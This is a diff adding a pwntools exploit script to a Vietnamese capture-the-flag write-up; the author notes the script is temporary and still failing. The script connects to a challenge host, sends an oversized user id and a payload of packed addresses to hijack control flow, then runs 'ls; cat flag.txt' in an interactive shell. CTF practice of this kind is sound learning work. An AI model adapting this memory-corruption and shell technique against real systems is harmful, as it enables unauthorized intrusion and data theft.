@@ -234,6 +234,65 @@ Và đây là biễu diễn memory khi chương trình bị crash:
 
 <img width="808" height="776" alt="image" src="https://github.com/user-attachments/assets/713ff3f5-f4c0-4b6b-9a40-c88fa4eff5be" />
 
+Script tạm thời (vì nó lỗi):
+```python
+from pwn import *
+
+# --------------------------------------------------
+# Setup
+# --------------------------------------------------
+exe = context.binary = ELF('./test')
+context.log_level = 'info'
+
+def GDB():
+    if not args.REMOTE:
+        gdb.attach(p, gdbscript='''
+        br *main+129
+        br *main+208
+        x/50gx 0x403630 
+        ''')
+
+info = lambda msg: log.info(msg)
+sla  = lambda msg, data: p.sendlineafter(msg, data)
+sa   = lambda msg, data: p.sendafter(msg, data)
+sl   = lambda data: p.sendline(data)
+s    = lambda data: p.send(data)
+
+# --------------------------------------------------
+# Connection
+# --------------------------------------------------
+if args.REMOTE:
+    p = remote("67.223.119.69", 5000)   
+else:
+    p = process(exe.path)
+
+# GDB()
+
+# --------------------------------------------------
+# Stage 1: Leak PIE / exe base
+# --------------------------------------------------
+max_id = b"230584300921369393"
+sla(b'a user.\n', b'1')
+sla(b'your choice:', b'1')
+sla(b'user \'s id:', max_id)
+
+payload = p64(0x0000000000401080) + p64(0x0000000000401090)
+payload += p64(0x00000000004010a0) + p64(0x00000000004010b0)
+payload += p64(0x00000000004010c0) + p64(0x00000000004010d0)
+payload += p64(0x00000000004010e0) + p64(0x00000000004010f0)
+# payload += p64(0x0000000000401100) 
+payload += p64(0x00000000004012d6)
+
+
+sla(b'user \'s name:', payload)
+
+
+# sla(b'your choice:', b'4')
+context
+p.sendline(b"ls; cat flag.txt")
+p.interactive()
+```
+
 <!!!>
 Hiện tại đang bị gặp lỗi nên đang trong quá trình tìm lỗi:
 
